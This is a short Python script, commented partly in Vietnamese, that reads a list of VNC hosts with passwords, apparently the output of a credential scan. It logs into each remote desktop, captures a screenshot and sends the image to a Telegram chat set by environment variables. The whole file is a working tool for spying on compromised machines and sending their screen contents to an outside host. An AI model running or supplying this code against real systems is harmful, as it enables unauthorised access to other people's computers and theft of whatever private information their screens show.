import os
import time
from vncdotool import api
from telegram import Bot

# Path to the list of VNC servers
RESULTS_FILE = "results.txt"

# Read the targets from RESULTS_FILE
with open(RESULTS_FILE, "r", encoding="utf-8") as file:
    lines = [ln.strip() for ln in file if ln.strip()]

# Hàm để kiểm tra VNC và chụp ảnh
def check_vnc(ip, port, password, name):
    try:
        client = api.connect(f"{ip}::{port}", password=password)
        time.sleep(5)
        image_path = f"{name}.png"
        client.captureScreen(image_path)
        client.disconnect()
        return image_path
    except Exception as e:
        print(f"Failed to connect to VNC {ip}:{port} with error: {e}")
        return None

# Hàm gửi ảnh qua Telegram
def send_telegram_photo(image_path, bot_token, chat_id):
    bot = Bot(token=bot_token)
    with open(image_path, "rb") as img:
        bot.send_photo(chat_id=chat_id, photo=img)

# Thông tin Telegram bot
bot_token = os.getenv("TELEGRAM_BOT_TOKEN")
chat_id = os.getenv("TELEGRAM_CHAT_ID")

if not bot_token or not chat_id:
    raise RuntimeError(
        "Missing Telegram credentials. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID"
    )

# Lặp qua các dòng và kiểm tra VNC
for line in lines:
    parts = line.split('-', 2)
    if len(parts) == 3:
        ip_port, password, name = parts
        if ':' not in ip_port:
            print(f"Invalid entry: {line}")
            continue
        ip, port = ip_port.split(':', 1)
        name = name.strip('[]')
        image_path = check_vnc(ip, port, password, name)
        if image_path:
            send_telegram_photo(image_path, bot_token, chat_id)
            os.remove(image_path)
